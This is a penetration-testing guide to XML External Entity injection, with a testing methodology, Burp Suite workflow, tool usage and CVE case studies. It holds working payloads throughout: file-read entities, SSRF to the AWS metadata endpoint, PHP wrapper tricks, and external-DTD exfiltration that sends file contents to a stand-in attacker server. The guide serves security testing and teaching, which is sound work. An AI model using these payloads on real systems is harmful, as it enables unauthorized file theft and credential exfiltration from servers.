# The Complete Methodology for Exploiting XXE Vulnerabilities

This guide provides a practical, step-by-step methodology for identifying and exploiting XML External Entity (XXE) injection vulnerabilities. It draws from real-world incidents, framework-specific examples, and hands-on testing techniques used by security professionals.

---

## Table of Contents
1. [Understanding XXE: The Basics](#understanding)
2. [Step-by-Step Testing Methodology](#methodology)
3. [How to Test with Burp Suite](#burp-testing)
4. [Real-World Exploitation Examples](#real-world)
5. [XXE in Popular Frameworks](#frameworks)
6. [Tools of the Trade](#tools)
7. [Blind XXE: The Silent Threat](#blind-xxe)
8. [Past Incidents: Learning from History](#past-incidents)

---

<a id="understanding"></a>
## 1. Understanding XXE: The Basics

XML External Entity injection occurs when an application processes XML input that contains references to external entities. Think of it like this: XML allows you to define variables (entities) that can pull data from files or URLs. When a parser is misconfigured, it follows these references, allowing an attacker to read files, make requests, or trigger actions from the server.

**The Core Concept:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
This defines an entity named `&xxe;` that contains the contents of `/etc/passwd`. When the application processes the XML and outputs `&xxe;`, the file contents appear in the response.

---

<a id="methodology"></a>
## 2. Step-by-Step Testing Methodology

### Phase 1: Discovery and Mapping

**Step 1: Identify XML Entry Points**

XML can appear in unexpected places. Check every location where your application sends data:

| Location | What to Look For |
|----------|------------------|
| HTTP Request Body | Content-Type: application/xml |
| File Uploads | DOCX, XLSX, SVG, PDF, ZIP files |
| SOAP APIs | Endpoints like /soap, /api/soap, /wsdl |
| RSS/Atom Feeds | Feed generation or import features |
| SAML Authentication | SSO requests and responses |

**Real-World Discovery Technique:** When testing Report Portal for CVE-2021-29620, researchers first mapped the entire application attack surface using directory fuzzing :
```bash
ffuf -u http://target.com/FUZZ -w wordlists/common.txt
```
This revealed `/api/v1/api-docs` - a Swagger endpoint that documented the complete API structure. Within that documentation, they found `/v1/{projectName}/launch/import` - an endpoint that processed XML files.

**Step 2: Change Content Types**

Many applications accept multiple formats. Try changing the Content-Type header:
- From `application/json` to `application/xml`
- From `application/x-www-form-urlencoded` to `text/xml`

If the application processes your XML input, you've found a potential attack surface.

**Step 3: Send a Basic Detection Payload**

```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY test "TEST_STRING_123">]>
<root>
  <data>&test;</data>
</root>
```

If `TEST_STRING_123` appears in the response, the parser evaluates entities. You can proceed to exploitation.

### Phase 2: Exploitation Testing

**Step 4: Test for File Read**

```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

**What to look for:**
- The actual contents of `/etc/passwd` in the response
- Partial output (some special characters may break XML parsing)
- Error messages that might reveal file existence

**If This Fails:** The application may be vulnerable to Blind XXE (see Section 7).

**Step 5: Test for SSRF (Server-Side Request Forgery)**

```xml
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

This tests whether the server can be tricked into making requests to internal resources. The AWS metadata endpoint is a classic target.

### Phase 3: Advanced Exploitation

**Step 6: Handle Special Characters with Encoding**

If direct file read fails or returns garbled data, use Base64 encoding (PHP environments):

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root>&xxe;</root>
```

Decode the response:
```bash
echo "base64encodeddatahere" | base64 -d
```

**Step 7: Test Blind XXE with Out-of-Band (OOB) Detection**

When the application never returns entity values in responses, you need to detect callbacks to your server.

Create a test payload pointing to a server you control:
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR-SERVER.COM/test">
%xxe;
]>
```

Monitor your server logs. If you see a request, the application is vulnerable to Blind XXE.

---

<a id="burp-testing"></a>
## 3. How to Test with Burp Suite

Burp Suite Professional provides the most streamlined workflow for XXE testing .

### Automated Scanning with Burp Scanner

1. **Capture a request** containing XML in Proxy > HTTP history
2. **Right-click** the request and select "Do active scan"
3. **Monitor the Dashboard** > Issues tab for any XXE findings
4. Burp Scanner automatically tests both in-band and blind variants

### Manual Testing with Burp Repeater

**For Classic XXE (Visible Output):**

1. **Send to Repeater:** Right-click any XML request > Send to Repeater
2. **Insert payload:** Modify the XML to include a DOCTYPE definition:
   ```xml
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   ```
3. **Replace a data value** with your entity: `&xxe;`
4. **Click Send** and examine the response

**For Blind XXE (No Visible Output):**

Burp Suite Professional includes Collaborator - a built-in server that catches out-of-band interactions .

1. **Go to the Collaborator tab** and click "Copy to clipboard" to get a unique subdomain
2. **Create a payload** using your Collaborator address:
   ```xml
   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://YOUR-COLLABORATOR.oastify.com"> ]>
   ```
3. **Send the request** using Repeater
4. **Return to Collaborator tab** and click "Poll now"
5. **Look for interactions** - DNS or HTTP requests to your Collaborator server

**Important Note:** There may be a delay before interactions appear. The Collaborator tab flashes when an interaction occurs .

### Testing Blind XXE with Data Exfiltration

For cases where you need to actually retrieve file contents (not just confirm vulnerability) :

**Step 1: Create a malicious DTD file**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://YOUR-COLLABORATOR.oastify.com/?x=%file;'>">
%eval;
%exfil;
```

**Step 2: Host this file** - In PortSwigger labs, use the "Exploit Server". In real tests, host on a server you control.

**Step 3: Send a payload that references your DTD**
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
%xxe;
]>
```

**Step 4: Monitor Collaborator** - The file contents appear in the HTTP request to your server.

---

<a id="real-world"></a>
## 4. Real-World Exploitation Examples

### Example 1: SysAid XXE to RCE (CVE-2025-2775-2777)

**The Vulnerability:** Unauthenticated XXE in SysAid's SOAP endpoints `/mdm/checkin` and `/lshw` .

**The Exploitation Chain:**

An attacker could chain XXE with other vulnerabilities to achieve full remote code execution:

1. **Discover a vulnerable SysAid instance** (version ≤ 23.3.40)
2. **Craft a malicious XML payload** targeting `/mdm/serverurl`:
   ```xml
   <!DOCTYPE foo SYSTEM "http://ATTACKER-SERVER/evil.dtd">
   ```
3. **The DTD reads the admin setup file** containing credentials
4. **Credentials are exfiltrated** to the attacker's server
5. **Attacker logs in** and abuses the API to write a batch file
6. **Execute arbitrary OS commands** as SYSTEM

**Why This Matters:** This demonstrates that XXE is rarely an isolated issue. It often serves as the entry point for more severe compromise.

### Example 2: Allure Report XXE (CVE-2025-52888)

**The Vulnerability:** The xunit-xml-plugin in Allure Report used `DocumentBuilderFactory` without disabling DTDs or external entities .

**The Attack Vector:** An attacker could create a malicious XML test result file. When a developer or CI/CD pipeline generated a report using Allure, the XXE payload would execute.

**The Payload:**
```xml
<!-- File reading payload -->
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///windows/win.ini">
]>
<test-results>
  <result>&xxe;</result>
</test-results>
```

**The Impact:** This was especially dangerous in CI/CD environments where Allure runs automatically on test results. An attacker could read source code, API keys, and other secrets from the build server.

### Example 3: Report Portal OOB XXE (CVE-2021-29620)

This case demonstrates the complexity of real XXE exploitation - it's rarely as simple as sending one payload .

**The Challenge:** The application didn't return any XML output, and classic in-band tests failed.

**The Methodology That Worked:**

1. **Authentication Required:** The attacker needed valid credentials first
2. **Attack Surface Mapping:** Used ffuf to discover `/api/v1/api-docs` endpoint
3. **API Analysis:** Found `/v1/{projectName}/launch/import` in Swagger documentation
4. **Testing Progression:**
   - In-band test → Failed (no output returned)
   - OOB with general entity → Failed (no callback)
   - OOB with parameter entity → **Success! DNS callback received**

**The Lesson:** Persistence matters. Testing different entity types (general vs. parameter) and different interaction methods (in-band vs. out-of-band) is essential for complete coverage.

---

<a id="frameworks"></a>
## 5. XXE in Popular Frameworks

Different programming languages and XML parsers behave differently when processing XXE payloads . Understanding these differences is crucial for effective testing.

### PHP Environments

**Default Behavior:** PHP's libxml parser has external entity support enabled by default in many configurations.

**Most Effective Payloads:**
```xml
<!-- Standard file read -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- PHP filter for source code (bypasses special characters) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!-- Expect wrapper (RCE if enabled - rare) -->
<!ENTITY xxe SYSTEM "expect://id">
```

**Testing Note:** PHP filters are particularly useful because they handle special characters that might break XML structure (like `<`, `>`, `&` in source code).

### Java Environments

**Default Behavior:** Java's `DocumentBuilderFactory` historically allowed external entities unless explicitly disabled. Modern secure defaults exist but are not universal.

**Real-World Example:** The Allure Report vulnerability (CVE-2025-52888) existed because the code used:
```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Missing: factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
```

**Most Effective Payloads:**
```xml
<!-- Standard file read (works on most JVM implementations) -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Windows paths -->
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
```

### Python (lxml)

**Default Behavior:** The `lxml.etree.parse()` function has `resolve_entities=True` by default in many versions.

**Testing Note:** Python's error messages can be verbose and may leak file contents even when direct inclusion fails.

### .NET (C#)

**Default Behavior:** .NET's `XmlDocument` and `XmlReader` have historically been vulnerable unless explicitly configured with `XmlReaderSettings` that disable DTD processing.

**Testing Payload:**
```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### Framework-Specific Testing Lab

For hands-on practice, the `xxe-lab` project provides vulnerable demos in PHP, Java, Python, and C# . Each implementation behaves slightly differently, making it an excellent training ground.

---

<a id="tools"></a>
## 6. Tools of the Trade

### Burp Suite Professional (Commercial)

**Best for:** Comprehensive testing with automated scanning and Collaborator OOB detection

**Key Features:**
- Active Scanner automatically detects XXE 
- Collaborator provides out-of-band interaction detection 
- Repeater for manual payload crafting
- Intruder for fuzzing XML structures

### XXEinjector (Open Source)

**Best for:** Automated XXE exploitation once a vulnerability is confirmed

**Installation:**
```bash
git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector
ruby XXEinjector.rb --help
```

**Basic Usage:**
```bash
ruby XXEinjector.rb --host=YOUR-SERVER --file=target-requests.txt --path=/etc/passwd
```

### oxml_xxe (Open Source)

**Best for:** XXE in Office Open XML files (DOCX, XLSX, PPTX)

**GitHub:** https://github.com/BuffaloWill/oxml_xxe

### ffuf (Open Source)

**Best for:** Discovery phase - finding XML endpoints and API documentation

**Usage Example (from Report Portal testing) :**
```bash
# Discover API endpoints
ffuf -u http://target.com/api/v1/FUZZ -w wordlists/common.txt

# Fuzz for Swagger/OpenAPI docs
ffuf -u http://target.com/FUZZ -w wordlists/api-endpoints.txt
```

### Custom Testing Environment

**For Learning:** Set up the `xxe-lab` project locally :
```bash
git clone https://github.com/junefreemore/xxe-lab
cd xxe-lab/php_xxe
# Place in web server directory and access via browser
```

This provides controlled vulnerable environments in each language to practice payloads safely.

---

<a id="blind-xxe"></a>
## 7. Blind XXE: The Silent Threat

Blind XXE occurs when the application processes external entities but never returns their values in responses. You can't see the file contents directly, but you can still exfiltrate data.

### Detection Strategy

**Step 1: Test for Out-of-Band Interaction**

Send a payload that triggers a request to your server:
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/test">
%xxe;
]>
```

If you see an HTTP request in your logs, the application is vulnerable to Blind XXE.

**Step 2: Determine Entity Type Support**

Not all entities work the same way. Test both:
- **General entities** (`&entity;`)
- **Parameter entities** (`%entity;`)

In the Report Portal case, general entities didn't trigger callbacks, but parameter entities did . Always test both.

### Data Exfiltration Techniques

**Technique 1: OOB with External DTD**

Host a malicious DTD file on your server (`evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%eval;
%exfil;
```

Send this payload:
```xml
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
%xxe;
]>
```

**How it works:**
1. Your payload triggers the remote DTD
2. The DTD reads `/etc/passwd` into `%file`
3. It constructs a URL with the file contents
4. The server makes a request to YOUR-SERVER containing the data

**Technique 2: Error-Based Exfiltration**

When OOB is blocked (firewalls, no internet access), you can force error messages that leak data.

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY xxe SYSTEM 'file:///nonexistent/%file;'>">
%error;
]>
```

If the parser throws an error mentioning the file path, you've achieved exfiltration through error messages.

**Technique 3: FTP Exfiltration (Alternative Protocol)**

Some firewalls block HTTP but allow FTP:
```xml
<!ENTITY % exfil SYSTEM "ftp://YOUR-SERVER/%file;">
```

### Common Blind XXE Challenges

**Challenge 1: No Internet Access**

If the server cannot reach the internet, you cannot use traditional OOB techniques. Try:
- Error-based exfiltration
- Local file inclusion via XInclude (if supported)
- Time-based detection (if you can cause delays)

**Challenge 2: Special Characters Break URLs**

File contents often contain characters (`#`, `?`, `&`, space) that break URLs. Base64-encode the data:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

**Challenge 3: DTD Hosting Limitations**

In real tests, you need a publicly accessible server to host your DTD. Options:
- Your own VPS with HTTP server
- Burp Collaborator (Professional only)
- Interactsh (free, open-source alternative)

---

<a id="past-incidents"></a>
## 8. Past Incidents: Learning from History

### CVE-2024-8010: WSO2 API Manager (2024)

**The Vulnerability:** XML External Entity injection in the publisher component 

**Affected Versions:** All versions before specific patches (3.2.0.397, 4.0.0.310, 4.1.0.171, etc.)

**The Impact:** Attackers could read confidential files from the filesystem and access limited HTTP resources via GET requests to the vulnerable product.

**Why It Happened:** The publisher component accepted XML input without disabling external entity resolution.

**The Lesson:** API management platforms are high-value targets. Any component that accepts XML input - even administrative interfaces - must disable external entities.

### CVE-2024-22024: Ivanti Connect Secure (2024)

**The Vulnerability:** XXE in the SAML component of Ivanti VPN products

**The Impact:** Unauthenticated attackers could access restricted resources

**The Timeline:**
- Patch released
- Within days, attackers began exploiting
- Over 80 IP addresses scanning for vulnerable instances
- More than 30,000 hosts targeted

**The Lesson:** Patch quickly. Exploitation happens FAST after disclosure. SAML implementations are common XXE vectors because they involve XML parsing for authentication.

### CVE-2025-9316 & CVE-2025-11700: N-able N-Central (2025)

**The Vulnerability:** Authentication bypass combined with XXE

**The Exploitation Chain:**
1. Send a sessionHello SOAP request with various appliance IDs
2. Obtain an unauthenticated session (CVE-2025-9316)
3. Write an XXE payload file
4. Trigger via importServiceTemplateFromFile
5. Read sensitive files 

**Files Accessible via XXE:**
- `/opt/nable/var/ncsai/etc/ncbackup.conf` (configuration)
- `/var/opt/n-central/tmp/ncbackup/ncbackup.bin` (PostgreSQL database dump)
- `/opt/nable/etc/masterPassword` (keystore password)

**The Lesson:** XXE often combines with other vulnerabilities. Single vulnerabilities are rarely exploited in isolation - chains provide the greatest impact.

### North Grid Proself CVE-2023-45727

**The Vulnerability:** XXE allowing unauthenticated file read

**The Impact:** Attackers could read server files containing account data

**Why Notable:** Added to CISA's Known Exploited Vulnerabilities catalog in December 2024, indicating active exploitation in the wild years after disclosure.

**The Lesson:** Old vulnerabilities don't die. If you don't patch, attackers will eventually find and exploit them.

---

## Summary: The Complete XXE Testing Workflow

```
┌─────────────────────────────────────────────────────────────┐
│ Phase 1: Discovery                                          │
├─────────────────────────────────────────────────────────────┤
│ • Identify all XML entry points (forms, uploads, APIs)     │
│ • Fuzz for API documentation (/api-docs, /swagger, /wsdl)  │
│ • Test content-type manipulation                            │
│ • Send basic entity detection payload                       │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 2: Confirmation                                       │
├─────────────────────────────────────────────────────────────┤
│ • Test file read (file://)                                  │
│ • Test SSRF (http://internal-ip)                           │
│ • If no output → Test Blind XXE with Collaborator          │
│ • Test both general and parameter entities                  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 3: Exploitation                                       │
├─────────────────────────────────────────────────────────────┤
│ • Direct read if output visible                             │
│ • OOB exfiltration with external DTD                        │
│ • Error-based exfiltration if OOB blocked                   │
│ • PHP wrapper for encoded source code                       │
│ • Chain with other vulnerabilities (RCE, auth bypass)      │
└─────────────────────────────────────────────────────────────┘
```

---

## References and Further Reading

1. PortSwigger Web Security Academy: [XXE Vulnerabilities](https://portswigger.net/web-security/xxe)
2. CVE-2025-52888: Allure Report XXE Analysis
3. CVE-2024-8010: WSO2 API Manager Details
4. CVE-2021-29620: Report Portal OOB XXE Technical Write-up
5. OWASP XXE Prevention Cheat Sheet
6. Burp Suite Documentation: XXE Testing Workflow

---
